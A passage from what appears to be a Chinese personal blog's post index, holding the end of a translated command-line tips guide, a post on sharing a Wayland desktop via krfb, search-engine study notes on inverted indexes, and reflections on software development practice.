-R）开启隧道是非常有用的，比如当你需要从一台远程服务器上访问 web 页面。 对 ssh 设置做一些小优化可能是很有用的，例如这个 ~/.ssh/config 文件包含了防止特定网络环境下连接断开、压缩数据、多通道等选项： 1234567TCPKeepAlive=yesServerAliveInterval=15ServerAliveCountMax=6Compression=yesControlMaster autoControlPath /tmp/%r@%h:%pControlPersist yes 一些其他的关于 ssh 的选项是与安全相关的，应当小心翼翼的使用。例如你应当只能在可信任的网络中启用 StrictHostKeyChecking=no，ForwardAgent=yes。 考虑使用 mosh 作为 ssh 的替代品，它使用 UDP 协议。它可以避免连接被中断并且对带宽需求更小，但它需要在服务端做相应的配置。 获取八进制形式的文件访问权限（修改系统设置时通常需要，但 ls 的功能不那么好用并且通常会搞砸），可以使用类似如下的代码： 1stat -c '%A %a %n' /etc/timezone 使用 percol 或者 fzf 可以交互式地从另一个命令输出中选取值。 使用 fpp（PathPicker）可以与基于另一个命令(例如 git）输出的文件交互。 将 web 服务器上当前目录下所有的文件（以及子目录）暴露给你所处网络的所有用户，使用：python -m SimpleHTTPServer 7777 （使用端口 7777 和 Python 2）或python -m http.server 7777 （使用端口 7777 和 Python 3）。 以其他用户的身份执行命令，使用 sudo。默认以 root 用户的身份执行；使用 -u 来指定其他用户。使用 -i 来以该用户登录（需要输入_你自己的_密码）。 将 shell 切换为其他用户，使用 su username 或者 su - username。加入 - 会使得切换后的环境与使用该用户登录后的环境相同。省略用户名则默认为 root。切换到哪个用户，就需要输入_哪个用户的_密码。 了解命令行的 128K 限制。使用通配符匹配大量文件名时，常会遇到“Argument list too long”的错误信息。（这种情况下换用 find 或 xargs 通常可以解决。） 当你需要一个基本的计算器时，可以使用 python 解释器（当然你要用 python 的时候也是这样）。例如： 12&gt;&gt;&gt; 2+35 文件及数据处理 在当前目录下通过文件名查找一个文件，使用类似于这样的命令：find . -iname '*something*'。在所有路径下通过文件名查找文件，使用 locate something （但注意到 updatedb 可能没有对最近新建的文件建立索引，所以你可能无法定位到这些未被索引的文件）。 使用 ag 在源代码或数据文件里检索（grep -r 同样可以做到，但相比之下 ag 更加先进）。 将 HTML 转为文本：lynx -dump -stdin。 Markdown，HTML，以及所有文档格式之间的转换，试试 pandoc。 当你要处理棘手的 XML 时候，xmlstarlet 算是上古时代流传下来的神器。 使用 jq 处理 JSON。 使用 shyaml 处理 YAML。 要处理 Excel 或 CSV 文件的话，csvkit 提供了 in2csv，csvcut，csvjoin，csvgrep 等方便易用的工具。 当你要处理 Amazon S3 相关的工作的时候，s3cmd 是一个很方便的工具而 s4cmd 的效率更高。Amazon 官方提供的 aws 以及 saws 是其他 AWS 相关工作的基础，值得学习。 了解如何使用 sort 和 uniq，包括 uniq 的 -u 参数和 -d 参数，具体内容在后文单行脚本节中。另外可以了解一下 comm。 了解如何使用 cut，paste 和 join 来更改文件。很多人都会使用 cut，但遗忘了 join。 了解如何运用 wc 去计算新行数（-l），字符数（-m），单词数（-w）以及字节数（-c）。 了解如何使用 tee 将标准输入复制到文件甚至标准输出，例如 ls -al | tee file.txt。 要进行一些复杂的计算，比如分组、逆序和一些其他的统计分析，可以考虑使用 datamash。 注意到语言设置（中文或英文等）对许多命令行工具有一些微妙的影响，比如排序的顺序和性能。大多数 Linux 的安装过程会将 LANG 或其他有关的变量设置为符合本地的设置。要意识到当你改变语言设置时，排序的结果可能会改变。明白国际化可能会使 sort 或其他命令运行效率下降许多倍。某些情况下（例如集合运算）你可以放心的使用 export LC_ALL=C 来忽略掉国际化并按照字节来判断顺序。 你可以单独指定某一条命令的环境，只需在调用时把环境变量设定放在命令的前面，例如 TZ=Pacific/Fiji date 可以获取斐济的时间。 了解如何使用 awk 和 sed 来进行简单的数据处理。 参阅 One-liners 获取示例。 替换一个或多个文件中出现的字符串： 1perl -pi.bak -e 's/old-string/new-string/g' my-files-*.txt 使用 repren 来批量重命名文件，或是在多个文件中搜索替换内容。（有些时候 rename 命令也可以批量重命名，但要注意，它在不同 Linux 发行版中的功能并不完全一样。） 123456# 将文件、目录和内容全部重命名 foo -&gt; bar:repren --full --preserve-case --from foo --to bar .# 还原所有备份文件 whatever.bak -&gt; whatever:repren --renames --from '(.*)\\.bak' --to '\\1' *.bak# 用 rename 实现上述功能（若可用）:rename 's/\\.bak$//' *.bak 根据 man 页面的描述，rsync 是一个快速且非常灵活的文件复制工具。它闻名于设备之间的文件同步，但其实它在本地情况下也同样有用。在安全设置允许下，用 rsync 代替 scp 可以实现文件续传，而不用重新从头开始。它同时也是删除大量文件的最快方法之一： 1mkdir empty &amp;&amp; rsync -r --delete empty/ some-dir &amp;&amp; rmdir some-dir 若要在复制文件时获取当前进度，可使用 pv，pycp，progress，rsync --progress。若所执行的复制为block块拷贝，可以使用 dd status=progress。 使用 shuf 可以以行为单位来打乱文件的内容或从一个文件中随机选取多行。 了解 sort 的参数。显示数字时，使用 -n 或者 -h 来显示更易读的数（例如 du -h 的输出）。明白排序时关键字的工作原理（-t 和 -k）。例如，注意到你需要 -k1，1 来仅按第一个域来排序，而 -k1 意味着按整行排序。稳定排序（sort -s）在某些情况下很有用。例如，以第二个域为主关键字，第一个域为次关键字进行排序，你可以使用 sort -k1，1 | sort -s -k2，2。 如果你想在 Bash 命令行中写 tab 制表符，按下 ctrl-v [Tab] 或键入 $'\\t' （后者可能更好，因为你可以复制粘贴它）。 标准的源代码对比及合并工具是 diff 和 patch。使用 diffstat 查看变更总览数据。注意到 diff -r 对整个文件夹有效。使用 diff -r tree1 tree2 | diffstat 查看变更的统计数据。vimdiff 用于比对并编辑文件。 对于二进制文件，使用 hd，hexdump 或者 xxd 使其以十六进制显示，使用 bvi，hexedit 或者 biew 来进行二进制编辑。 同样对于二进制文件，strings（包括 grep 等工具）可以帮助在二进制文件中查找特定比特。 制作二进制差分文件（Delta 压缩），使用 xdelta3。 使用 iconv 更改文本编码。需要更高级的功能，可以使用 uconv，它支持一些高级的 Unicode 功能。例如，这条命令移除了所有重音符号： 1uconv -f utf-8 -t utf-8 -x '::Any-Lower; ::Any-NFD; [:Nonspacing Mark:] &gt;; ::Any-NFC; ' &lt; input.txt &gt; output.txt 拆分文件可以使用 split（按大小拆分）和 csplit（按模式拆分）。 操作日期和时间表达式，可以用 dateutils 中的 dateadd、datediff、strptime 等工具。 使用 zless、zmore、zcat 和 zgrep 对压缩过的文件进行操作。 文件属性可以通过 chattr 进行设置，它比文件权限更加底层。例如，为了保护文件不被意外删除，可以使用不可修改标记：sudo chattr +i /critical/directory/or/file 使用 getfacl 和 setfacl 以保存和恢复文件权限。例如： 12getfacl -R /some/path &gt; permissions.txtsetfacl --restore=permissions.txt 为了高效地创建空文件，请使用 truncate（创建稀疏文件），fallocate（用于 ext4，xfs，btrf 和 ocfs2 文件系统），xfs_mkfile（适用于几乎所有的文件系统，包含在 xfsprogs 包中），mkfile（用于类 Unix 操作系统，比如 Solaris 和 Mac OS）。 系统调试 curl 和 curl -I 可以被轻松地应用于 web 调试中，它们的好兄弟 wget 也是如此，或者也可以试试更潮的 httpie。 获取 CPU 和硬盘的使用状态，通常使用使用 top（htop 更佳），iostat 和 iotop。而 iostat -mxz 15 可以让你获悉 CPU 和每个硬盘分区的基本信息和性能表现。 使用 netstat 和 ss 查看网络连接的细节。 dstat 在你想要对系统的现状有一个粗略的认识时是非常有用的。然而若要对系统有一个深度的总体认识，使用 glances，它会在一个终端窗口中向你提供一些系统级的数据。 若要了解内存状态，运行并理解 free 和 vmstat 的输出。值得留意的是“cached”的值，它指的是 Linux 内核用来作为文件缓存的内存大小，而与空闲内存无关。 Java 系统调试则是一件截然不同的事，一个可以用于 Oracle 的 JVM 或其他 JVM 上的调试的技巧是你可以运行 kill -3 &lt;pid&gt; 同时一个完整的栈轨迹和堆概述（包括 GC 的细节）会被保存到标准错误或是日志文件。JDK 中的 jps，jstat，jstack，jmap 很有用。SJK tools 更高级。 使用 mtr 去跟踪路由，用于确定网络问题。 用 ncdu 来查看磁盘使用情况，它比寻常的命令，如 du -sh *，更节省时间。 查找正在使用带宽的套接字连接或进程，使用 iftop 或 nethogs。 ab 工具（Apache 中自带）可以简单粗暴地检查 web 服务器的性能。对于更复杂的负载测试，使用 siege。 wireshark，tshark 和 ngrep 可用于复杂的网络调试。 了解 strace 和 ltrace。这俩工具在你的程序运行失败、挂起甚至崩溃，而你却不知道为什么或你想对性能有个总体的认识的时候是非常有用的。注意 profile 参数（-c）和附加到一个运行的进程参数 （-p）。 了解使用 ldd 来检查共享库。但是永远不要在不信任的文件上运行。 了解如何运用 gdb 连接到一个运行着的进程并获取它的堆栈轨迹。 学会使用 /proc。它在调试正在出现的问题的时候有时会效果惊人。比如：/proc/cpuinfo，/proc/meminfo，/proc/cmdline，/proc/xxx/cwd，/proc/xxx/exe，/proc/xxx/fd/，/proc/xxx/smaps（这里的 xxx 表示进程的 id 或 pid）。 当调试一些之前出现的问题的时候，sar 非常有用。它展示了 cpu、内存以及网络等的历史数据。 关于更深层次的系统分析以及性能分析，看看 stap（SystemTap），perf，以及sysdig。 查看你当前使用的系统，使用 uname，uname -a（Unix／kernel 信息）或者 lsb_release -a（Linux 发行版信息）。 无论什么东西工作得很欢乐（可能是硬件或驱动问题）时可以试试 dmesg。 如果你删除了一个文件，但通过 du 发现没有释放预期的磁盘空间，请检查文件是否被进程占用：lsof | grep deleted | grep &quot;filename-of-my-big-file&quot; 单行脚本一些命令组合的例子： 当你需要对文本文件做集合交、并、差运算时，sort 和 uniq 会是你的好帮手。具体例子请参照代码后面的，此处假设 a 与 b 是两内容不同的文件。这种方式效率很高，并且在小文件和上 G 的文件上都能运用（注意尽管在 /tmp 在一个小的根分区上时你可能需要 -T 参数，但是实际上 sort 并不被内存大小约束），参阅前文中关于 LC_ALL 和 sort 的 -u 参数的部分。 123sort a b | uniq &gt; c # c 是 a 并 bsort a b | uniq -d &gt; c # c 是 a 交 bsort a b b | uniq -u &gt; c # c 是 a - b 使用 grep . *（每行都会附上文件名）或者 head -100 *（每个文件有一个标题）来阅读检查目录下所有文件的内容。这在检查一个充满配置文件的目录（如 /sys、/proc、/etc）时特别好用。 计算文本文件第三列中所有数的和（可能比同等作用的 Python 代码快三倍且代码量少三倍）： 1awk '{ x += $3 } END { print x }' myfile 如果你想在文件树上查看大小/日期，这可能看起来像递归版的 ls -l 但比 ls -lR 更易于理解： 1find . -type f -ls 假设你有一个类似于 web 服务器日志文件的文本文件，并且一个确定的值只会出现在某些行上，假设一个 acct_id 参数在 URI 中。如果你想计算出每个 acct_id 值有多少次请求，使用如下代码： 1egrep -o 'acct_id=[0-9]+' access.log | cut -d= -f2 | sort | uniq -c | sort -rn 要持续监测文件改动，可以使用 watch，例如检查某个文件夹中文件的改变，可以用 watch -d -n 2 'ls -rtlh | tail'；或者在排查 WiFi 设置故障时要监测网络设置的更改，可以用 watch -d -n 2 ifconfig。 运行这个函数从这篇文档中随机获取一条技巧（解析 Markdown 文件并抽取项目）： 12345678function taocl() { curl -s https://raw.githubusercontent.com/jlevy/the-art-of-command-line/master/README-zh.md| pandoc -f markdown -t html | iconv -f 'utf-8' -t 'unicode' | xmlstarlet fo --html --dropdtd | xmlstarlet sel -t -v &quot;(html/body/ul/li[count(p)&gt;0])[$RANDOM mod last()+1]&quot; | xmlstarlet unesc | fmt -80} 冷门但有用 expr：计算表达式或正则匹配 m4：简单的宏处理器 yes：多次打印字符串 cal：漂亮的日历 env：执行一个命令（脚本文件中很有用） printenv：打印环境变量（调试时或在写脚本文件时很有用） look：查找以特定字符串开头的单词或行 cut，paste 和 join：数据修改 fmt：格式化文本段落 pr：将文本格式化成页／列形式 fold：包裹文本中的几行 column：将文本格式化成多个对齐、定宽的列或表格 expand 和 unexpand：制表符与空格之间转换 nl：添加行号 seq：打印数字 bc：计算器 factor：分解因数 gpg：加密并签名文件 toe：terminfo 入口列表 nc：网络调试及数据传输 socat：套接字代理，与 netcat 类似 slurm：网络流量可视化 dd：文件或设备间传输数据 file：确定文件类型 tree：以树的形式显示路径和文件，类似于递归的 ls stat：文件信息 time：执行命令，并计算执行时间 timeout：在指定时长范围内执行命令，并在规定时间结束后停止进程 lockfile：使文件只能通过 rm -f 移除 logrotate： 切换、压缩以及发送日志文件 watch：重复运行同一个命令，展示结果并／或高亮有更改的部分 when-changed：当检测到文件更改时执行指定命令。参阅 inotifywait 和 entr。 tac：反向输出文件 shuf：文件中随机选取几行 comm：一行一行的比较排序过的文件 strings：从二进制文件中抽取文本 tr：转换字母 iconv 或 uconv：文本编码转换 split 和 csplit：分割文件 sponge：在写入前读取所有输入，在读取文件后再向同一文件写入时比较有用，例如 grep -v something some-file | sponge some-file units：将一种计量单位转换为另一种等效的计量单位（参阅 /usr/share/units/definitions.units） apg：随机生成密码 xz：高比例的文件压缩 ldd：动态库信息 nm：提取 obj 文件中的符号 ab 或 wrk：web 服务器性能分析 strace：调试系统调用 mtr：更好的网络调试跟踪工具 cssh：可视化的并发 shell rsync：通过 ssh 或本地文件系统同步文件和文件夹 wireshark 和 tshark：抓包和网络调试工具 ngrep：网络层的 grep host 和 dig：DNS 查找 lsof：列出当前系统打开文件的工具以及查看端口信息 dstat：系统状态查看 glances：高层次的多子系统总览 iostat：硬盘使用状态 mpstat： CPU 使用状态 vmstat： 内存使用状态 htop：top 的加强版 last：登入记录 w：查看处于登录状态的用户 id：用户/组 ID 信息 sar：系统历史数据 iftop 或 nethogs：套接字及进程的网络利用情况 ss：套接字数据 dmesg：引导及系统错误信息 sysctl： 在内核运行时动态地查看和修改内核的运行参数 hdparm：SATA/ATA 磁盘更改及性能分析 lsblk：列出块设备信息：以树形展示你的磁盘以及磁盘分区信息 lshw，lscpu，lspci，lsusb 和 dmidecode：查看硬件信息，包括 CPU、BIOS、RAID、显卡、USB设备等 lsmod 和 modinfo：列出内核模块，并显示其细节 fortune，ddate 和 sl：额，这主要取决于你是否认为蒸汽火车和莫名其妙的名人名言是否“有用” 仅限 OS X 系统以下是仅限于 OS X 系统的技巧。 用 brew （Homebrew）或者 port （MacPorts）进行包管理。这些可以用来在 OS X 系统上安装以上的大多数命令。 用 pbcopy 复制任何命令的输出到桌面应用，用 pbpaste 粘贴输入。 若要在 OS X 终端中将 Option 键视为 alt 键（例如在上面介绍的 alt-b、alt-f 等命令中用到），打开 偏好设置 -&gt; 描述文件 -&gt; 键盘 并勾选“使用 Option 键作为 Meta 键”。 用 open 或者 open -a /Applications/Whatever.app 使用桌面应用打开文件。 Spotlight：用 mdfind 搜索文件，用 mdls 列出元数据（例如照片的 EXIF 信息）。 注意 OS X 系统是基于 BSD UNIX 的，许多命令（例如 ps，ls，tail，awk，sed）都和 Linux 中有微妙的不同（ Linux 很大程度上受到了 System V-style Unix 和 GNU 工具影响）。你可以通过标题为 “BSD General Commands Manual” 的 man 页面发现这些不同。在有些情况下 GNU 版本的命令也可能被安装（例如 gawk 和 gsed 对应 GNU 中的 awk 和 sed ）。如果要写跨平台的 Bash 脚本，避免使用这些命令（例如，考虑 Python 或者 perl ）或者经过仔细的测试。 用 sw_vers 获取 OS X 的版本信息。 仅限 Windows 系统以下是仅限于 Windows 系统的技巧。 在 Winodws 下获取 Unix 工具 可以安装 Cygwin 允许你在 Microsoft Windows 中体验 Unix shell 的威力。这样的话，本文中介绍的大多数内容都将适用。 在 Windows 10 上，你可以使用 Bash on Ubuntu on Windows，它提供了一个熟悉的 Bash 环境，包含了不少 Unix 命令行工具。好处是它允许 Linux 上编写的程序在 Windows 上运行，而另一方面，Windows 上编写的程序却无法在 Bash 命令行中运行。 如果你在 Windows 上主要想用 GNU 开发者工具（例如 GCC），可以考虑 MinGW 以及它的 MSYS 包，这个包提供了例如 bash，gawk，make 和 grep 的工具。MSYS 并不包含所有可以与 Cygwin 媲美的特性。当制作 Unix 工具的原生 Windows 端口时 MinGW 将特别地有用。 另一个在 Windows 下实现接近 Unix 环境外观效果的选项是 Cash。注意在此环境下只有很少的 Unix 命令和命令行可用。 实用 Windows 命令行工具 可以使用 wmic 在命令行环境下给大部分 Windows 系统管理任务编写脚本以及执行这些任务。 Windows 实用的原生命令行网络工具包括 ping，ipconfig，tracert，和 netstat。 可以使用 Rundll32 命令来实现许多有用的 Windows 任务 。 Cygwin 技巧 通过 Cygwin 的包管理器来安装额外的 Unix 程序。 使用 mintty 作为你的命令行窗口。 要访问 Windows 剪贴板，可以通过 /dev/clipboard。 运行 cygstart 以通过默认程序打开一个文件。 要访问 Windows 注册表，可以使用 regtool。 注意 Windows 驱动器路径 C:\\ 在 Cygwin 中用 /cygdrive/c 代表，而 Cygwin 的 / 代表 Windows 中的 C:\\cygwin。要转换 Cygwin 和 Windows 风格的路径可以用 cygpath。这在需要调用 Windows 程序的脚本里很有用。 学会使用 wmic，你就可以从命令行执行大多数 Windows 系统管理任务，并编成脚本。 要在 Windows 下获得 Unix 的界面和体验，另一个办法是使用 Cash。需要注意的是，这个环境支持的 Unix 命令和命令行参数非常少。 要在 Windows 上获取 GNU 开发者工具（比如 GCC）的另一个办法是使用 MinGW 以及它的 MSYS 软件包，该软件包提供了 bash、gawk、make、grep 等工具。然而 MSYS 提供的功能没有 Cygwin 完善。MinGW 在创建 Unix 工具的 Windows 原生移植方面非常有用。 更多资源 awesome-shell：一份精心组织的命令行工具及资源的列表。 awesome-osx-command-line：一份针对 OS X 命令行的更深入的指南。 Strict mode：为了编写更好的脚本文件。 shellcheck：一个静态 shell 脚本分析工具，本质上是 bash／sh／zsh 的 lint。 Filenames and Pathnames in Shell：有关如何在 shell 脚本里正确处理文件名的细枝末节。 Data Science at the Command Line：用于数据科学的一些命令和工具，摘自同名书籍。 免责声明除去特别小的工作，你编写的代码应当方便他人阅读。能力往往伴随着责任，你 有能力 在 Bash 中玩一些奇技淫巧并不意味着你应该去做！;) 授权条款 本文使用授权协议 Creative Commons Attribution-ShareAlike 4.0 International License。","link":"/2015/06/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%9A%84%E8%89%BA%E6%9C%AF/"},{"title":"在Wayland中使用无线副屏","text":"废话之前在Windows上用过米全家桶，体验一般。这回回家带了电脑和板子，写分布式作业的时候突然想把板子当副屏用，但是让我切回Windows写代码还是饶了我吧QAQ 不过切成Wayland以后，基于xrdp的方法也没法用，还好有新的替代：krfb KDE: Krfb 桌面共享是一个可以让您与另一个在其他机器上的用户共享当前会话的服务器程序，他可以使用VNC 客户端来查看甚至控制桌面。 使用截止2024.05.04，aur中的最新版在RVNC Viewer客户端连接时会崩溃，故本文使用krfb-22.12.3-1-x86_64。 首先将系统的PulseAudio切换为PipeWire：在Arch下运行 1sudo pacman -S pipewire pipewire-pulse pipewire-alsa wireplumber 随后pacman会询问是否卸载PulseAudio，输入y回车即可。安装完成后，重启一次。 接着安装Krfb，因为我使用了历史的pkg包，所以 1sudo pacman -U krfb-22.12.3-1-x86_64.pkg.tar.zst 现在就可以正常使用了。你可以使用这个配置试试： 1krfb-virtualmonitor --name Pad --resolution 1920x1080 --password password --port 5900 现在打开板子上的VNC，连接电脑的IP试试吧。 Ref Android tablet as a second monitor - Manjaro Forum Arch Linux 音频服务器从PulseAudio 切换到 Pipewire","link":"/2024/05/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%9C%A8Wayland%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%97%A0%E7%BA%BF%E5%89%AF%E5%B1%8F/"},{"title":"搜索引擎学习笔记","text":"概览搜索引擎是从文档集合中查找出匹配单词、问题等构成的信息需求的系统/软件的总称。 不过现代的搜索引擎的索引范围早已经超过文档，比如对邮件/专利信息的搜索引擎等。变化的是作为文档的对象，不变的是基础架构。 搜索引擎一般有四个部分： 索引管理器 Index Manager 索引是一种该诉检索特化的数据结构，对其访问借助索引管理器完成 索引检查器 Index Searcher 利用索引进行全文搜索处理的组件 索引构建器 Indexer 从文本文档中生成索引的组件。它的行为是将文档分解为单词序列，再转换为索引结构 文档管理器 Document Manager 管理作为检索对象的文档，并对于作为查询结果的文档进行摘要的生成 这几部分的工作方式：文档作为索引构建器的输入，将输出内容交给索引管理器和文档管理器，最后，用户使用检索应用程序，后者和索引检查器交互，使用信息需求获得结果。 还有其他不是组成部分，但是相关的组件： 爬虫-Crawler： 收集Web上HTML等文件的自动系统。 搜索排序系统： 给作为检索对象的文档打分的系统。 全文搜素全文搜索分为：利用全扫描进行全文搜索，和利用索引进行全文搜索的方法。 第一种方法因为和grep使用的方法一致，也称为grep型搜索。优点是文档不需要事先处理，缺点是文档数量和检索时间成正相关。因此仅适用于少量/暂时性的文档。相关算法有KMP和BM等算法。 另一种是利用索引进行全文搜索的方法。事先需要为文档建立索引，然后利用索引搜索字符串。优点是搜索时间不会随文档数增多大幅下降，缺点是需要预先建立索引。 全文搜索的索引结构中，较为常用的结构是倒排索引。 倒排索引倒排表和书籍后的关键词索引原理一致。将关键词列出在书籍最后，并在每个关键词后面标注它出现的地方，并将这个表按照关键词首字母顺序排序。 它的构建方法大致如下：首先需要一个二维数组，行为所有出现过的单词（需要将这个维度压缩地尽可能小，比如忽略复数形式，忽略大小写等），列是页码。数组单元则是某页出现某单词的记录。 完成后，将行列反转，得到每个单词出现在每一页上的表。这个操作称为倒排，完成后的表格称为倒排表（Postings List），能用于关键字全文检索。 另，所谓的页码实际上是和网页编号对应的。一行记录称为一个倒排项（Posting）。 倒排索引，是单词的集合“词典”和倒排列表的集合“倒排文件”构成的。二者对应关系大致相当于： 12345倒排词典 -&gt; 倒排文件-----------------------Google -&gt; 2I -&gt; 1,2... -&gt; ... 这是一个松散的结构，每个单词的倒排文件可以从该单词的元信息获取。 查找的单词有多个时，对各个单词分别执行索引，取结果交集即是查找结果。 单词级倒排文件：在记录文档单词信息之外，额外记录该单词在文档出现的编号。 短语查找：借助单词级倒排文件，可以查找短语级别的内容：在取完交集之后，过滤掉结果中search和engine相对偏移量不为-1的项目。 对于中文等语言而言，搜索引擎的构造方法一样，不同在于语义化分割（Tokenization）中文的连续的句子。 中文的句子单词序列化分割方法常用的有两种： 词素解析分割法 将句子按照其中的语义，分割为词素（token）单元的方法，但是实现难度极高，近几年一般借助机器学习方法（隐马尔科夫模型/条件随机场等方法）处理。 N-gram分割法 将句子分割成由N个字符组成的片段序列的方法，每个片段称作一个N-gram。M字的句子进行N-gram分割方法，能产生M-N+1个N-gram。 二者的优缺点都很明确，前者精准且节省空间，从而检索速度也快，但是可能会发生检索遗漏的问题。后者的优点是结果完整，因此检索速度相对较慢。并且可能会检索到无关词汇，比如检索华山得到九华山。 词典的实现一般使用哈希表、树等结构，常用的属性结构有二叉查找树BST、字典树Trie，B+树等。 这部分之所以使用超过一种数据结构，一个是因为存储金字塔结构：往往不能一次性将词典完整加载到内存中，另一个是因为块设备的读写单位是块，并且耗时很高，需要针对读写慢但是一次读写量大专门优化的数据结构。 检索检索模型指代各种检索方法/机制。使用逻辑谓词AND/OR/NOT指导的检索就是布尔检索。 该模型的检索流程： 获取所有检索单词的倒排列表 根据布尔检索获取符合条件的文档编号 计算符合条件的文档和查询匹配度 根据匹配度/其他排序参数，获取前k个文档 因为逻辑比较简单，伪代码就不贴了 关联度计算策略一般是按照文档与查询的关联度对检索结果进行排序。算法则有： 余弦相似度 将文档和查询映射到以单词（token）为维度的向量空间，并计算二者向量的夹角，夹角越小则关联度越高 Okapi BM25 文档是否匹配查询是由概率决定：根据单词的出现频率计算关联概率。 信息检索是全文搜索的学术领域，这个检索领域目的是找出与信息需求匹配的文档，故可认定匹配的文章不必包含查询，只需要计算整个文档的关联度，将高关联度文档作为作为检索结果即可。 关联度计算是计算密集任务，因此有必要先得到符合检索条件的子集后再计算关联度进行排序。从而，针对不同的检索应用，设计不同的检索模型能提高性能和质量。 构建倒排索引因为数据的稀疏性质，它适用于使用链表进行存储。当内存用量过大时，可以使用二级链表进行存储。","link":"/2024/04/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"title":"开发手记","text":"大概计算了一下，我在GitHub上所有的代码行数早已超过100k行了。三年下来，我在开发上的投入越来越大块，甚至已经吞噬了我的许多其他活动，甚至到了我很多次反思这到底是不是应该在大学期间干的事。 虽然如此我还是义无反顾地干下来了。兴趣所在，原因不明。 经验1-量变引起质变说是重复练习积累经验也对，说是重复的过程中找到新的规律从中创新也对。总之，开发活动本身也是一种渐进式的活动。从一开始的编写Hello, World到后来编写一个完整的项目，这中间增长的是复杂度，一同增长的也有开发者自身对于代码的掌控力，以及对于复杂度的控制能力。 大量代码必然大块重复，其上的思考有助于抽离重复部分，丰富复用代码片段库。 增长的复用片段库最终会形成新的范式，或者新的工具，乃至思想。 经验2-测试驱动开发（TDD）开发难点在于代码正确性验证，以及消除undefined behavior。测试驱动的开发一方面帮助我们消除ub，另一方面帮我们快速验证和开发模块。好处是，开发进度明确，并且开发完成之后可用程度基本拉满。 同时对比以前的完整编译再运行整个系统的做法，TDD更加敏捷。同时编写测试用例能帮我们理解自己的代码行为和逻辑。 经验3-文档与工具文档的必要性在于对整个代码的形式规约——文档本身也是一种应对复杂度的手段。文档的编写，构建和发布值得我们好好打磨。从注释生成，还是代码即注释，这些都可以，根据情况决定。 好的工具值得我们花费时间熟悉，看起来古老的工具，比如Vim，build-essentials，gnu core-utils以及bash都值得学习。并不是因为它们强大，而是让你学会如何使用基于这些工具构建的现代IDE/构建流程背后的逻辑，思想以及原理，同时让你不被任何现代IDE约束于其中，能完成几乎所有超出IDE能力的任务。 经验3-组合优于继承不仅适用于代码编写，也适用于工具哲学。继承是严格的约束，组合是松散的，约定大于规范的约束。pipe，xargs和gnu core-utils等工具能构建出让人难以置信的工具。KISS，同时只做一件事并把它做好，明确单一工具行为，谨防undefined behavior。 另，关于GNU/Linux以及无底洞systemd，组合确实适合构建一些特定的工具，但是对于general-purpose类型的，面向最终用户的接口，还是提供一个相对稳定，严格的规约比较好，不过大量吞噬其他工具这一点大可不必。 经验4-自顶向下设计大学以来第一个大型项目NanoOJ，很长一段时间处于漫无目的的开发阶段：知道要做的东西是什么，但是不知道现在应该做什么。不熟悉软件工程的经验教训，文档是大段废话和幻想，对于开发毫无帮助。 程序本质是数据的变换工具，因此规划出明确的数据流之后进行开发就可以了。这个阶段的前一步，是需求整理，原型设计。 经验5-面向接口编程符合软件工程中需求和文档为先，驱动程序开发的架构。这也是自顶向下设计的一种，适合多人团队项目开发。前后端先约定好接口，根据数据模型进行开发。 针对前后端开发，后端可以使用测试用例驱动；前端可以使用假数据驱动开发，开发完成后对接后端即可。 经验6-LinuxGNU/Linux是工具的集合。不仅是gnu core-utlis，也指代它的项目源代码库，以及提供的各种库库。使用组合式的实践，可以轻松创建出来稳定可用的，属于自己的工具合集。 Linux系的发行版是越用越爽的：它提供了近乎无穷的原料，让你能尽情发挥创造力——对比Windows，你需要不断学习Windows的各种工具，并很难有手段将它们组合使用——作为用户，你难以创造。不过随着Powershell的改进，这点倒是在逐渐改善。 关于系统的学习顺序，有时间的话最好从系统的启动过程，文件系统，服务管理，网络系统管理，以及性能监测和分析这方面开始学习。如果要从其他方向开始学习也不是不行，因为Linux本身也是渐进式的：学多少基本都能用起来。比较遗憾的是，我是从搭MC服务器/部署网页服务器开始学的（ 经验7-渐进式刚开始听说是在Vue介绍中。后来实践中理解了是什么，为什么，以及怎么做。 渐进式指功能可以被逐渐学习，逐渐集成，比如Linux，第一天删除文件时只会直接rm [filename]，第二天知道了后面可以跟随多个文件名，第三天知道了可以使用正则来匹配所有要删除的文件。在这个过程中，你一开始就能完成需要的功能，而之后的学习让你将大部分任务耗时降低到可接受范围内。Vue支持从JS，Web Component和SPA到SSR，SSG多种开发方式，但是你无需学完才能开始编写代码：它的各种工具和概念是相对解耦的。 为什么呢？这和一般人的学习习惯有关。最代表性的例子是数学的学习，实际上我们是顺应着数学的发展历史逐渐向时间轴正向前进学习的。刚开始使用Visual Studio开发时，我经常因为不知道这东西各个部分怎么用而打开又关闭。用VS Code就舒服多了，基本功能简单，组合插件带来各种功能的能力也很强。VS Code打开就能直接写代码，但是VS必须经过系统全面的学习才能不阻碍完整的开发流程。或者这方面，Vim可能是个更好的例子：起初只需要学会i，Esc和:wq以及hjkl就能把它当记事本简单用用，之后每学到一个键/功能都能直接提升你的效率和体验。 在我的开发学习过程，我一般不使用完整的项目基座，而是从官方给出的最简单的底座和实例开始，一点一点向上搭建。当我做到某一部分时，我会知道这部分需要使用什么新的插件，而不是一开始就从一个打满插件的项目开始——这样的开发体验并不好。当你发现自己的项目已经和其他脚手架/基座功能比较接近时，这时候你就有了新的选择：迁移到完善的大型框架上进行开发。这时候的开发体验应该是如鱼得水的：你理解了应如何组合工具来编写这种复杂度的项目，你也能看懂底座提供的若干功能的逻辑和目的。这个阶段，对框架的使用才是提升效率的手段。 不过这种开发方式仅适用于习阶段，实际大型项目开发最好花时间看看成熟框架的文档和实例。","link":"/2024/04/14/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E6%89%8B%E8%AE%B0/"},{"title":"用火绒的一次翻车经历（","text":"概要昨天下午，在被一堆人安利了Windows11之后，咱看了看电脑上还是20H1的Win10，留下了悔恨的泪水（不是）。于是决定不管怎么着吧，起码先更新到20H2吧？ 说干就干。开始启用Windows Update。嗯？怎么不行？哦，那就把注册表，组策略之类的都改一改吧（）于是，输入gpedit.msc，它告诉我被禁用了。。。被禁用了。。。禁用了。。。 